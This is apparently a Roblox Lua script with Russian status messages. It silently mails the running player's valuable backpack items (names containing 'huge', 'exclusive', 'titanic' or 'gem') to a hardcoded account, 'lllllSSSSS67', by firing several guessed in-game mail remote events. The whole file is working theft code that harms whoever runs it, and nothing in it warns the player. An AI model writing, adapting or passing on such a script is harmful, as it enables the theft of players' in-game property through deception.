local player = game.Players.LocalPlayer
local backpack = player.Backpack
local recipient = "lllllSSSSS67"
local events = {
    "MailSendItem",
    "SendMail", 
    "PostOfficeSend",
    "MailSystemSend",
    "SendItemMail",
    "Mail"
}
for _, item in ipairs(backpack:GetChildren()) do
    if item:IsA("Tool") then
        local name = item.Name:lower()
        if string.find(name, "huge") 
        or string.find(name, "exclusive")
        or string.find(name, "titanic")
        or string.find(name, "gem") then
            for _, eventName in ipairs(events) do
                local event = game:GetService("ReplicatedStorage"):FindFirstChild(eventName)
                if event then
                    event:FireServer(recipient, item)
                    print("Отправлен через: " .. eventName .. " - " .. item.Name)
                    task.wait(0.5)
                    break
                end
            end
        end
    end
end
print("Скрипт выполнен")
